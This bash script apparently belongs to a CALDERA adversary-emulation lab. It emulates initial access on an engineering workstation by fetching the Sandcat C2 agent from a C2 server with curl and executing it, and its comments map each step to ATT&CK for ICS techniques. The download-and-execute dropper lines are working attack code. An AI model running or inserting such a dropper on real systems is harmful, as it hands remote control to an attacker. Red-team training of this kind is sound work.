#!/usr/bin/env bash
# deploy-sandcat.sh — EMULATED INITIAL ACCESS (teaching artifact; nothing here exploits anything).
#
# In the real world the C2 agent does not appear on an engineering workstation by itself. It
# arrives through an earlier link in the attack chain:
#   * a USB stick dropped in a parking lot and plugged in
#       ATT&CK for ICS T0847 Replication Through Removable Media · CAPEC-452 Infected Hardware
#   * a phishing email attachment the engineer opens
#       ATT&CK for ICS T0865 Spearphishing Attachment · CAPEC-163 Spear Phishing
# This script STANDS IN for that delivery: it is what the dropped/opened payload would run once
# a human has been tricked into executing it — fetch the agent from the C2 and launch it:
#       ATT&CK T0863 User Execution · T1105 Ingress Tool Transfer
# Making the initial-access step explicit (and mapped) is the point: everything after it — the
# CALDERA operation that spoofs the phone sensor — only works because an agent is now on the
# engineer station that can reach the plant's MQTT broker.
set -e
SERVER="${CALDERA_URL:-http://10.20.30.50:8888}"
GROUP="${AGENT_GROUP:-red}"

echo "[dropper] emulated USB/phishing delivery — fetching the agent from the C2 at $SERVER"
for i in $(seq 1 30); do
  if curl -s -f -X POST -H "file:sandcat.go" -H "platform:linux" \
       "$SERVER/file/download" -o /tmp/sandcat 2>/dev/null && [ -s /tmp/sandcat ]; then
    break
  fi
  echo "[dropper] C2 not ready yet (attempt $i) — the caldera station may still be starting …"
  sleep 5
done
if [ ! -s /tmp/sandcat ]; then
  echo "[dropper] could not fetch the agent from $SERVER — is the caldera station up?" >&2
  exit 1
fi
chmod +x /tmp/sandcat
echo "[dropper] executing the agent — it checks in to $SERVER as group '$GROUP' and waits for tasking"
exec /tmp/sandcat -server "$SERVER" -group "$GROUP" -v
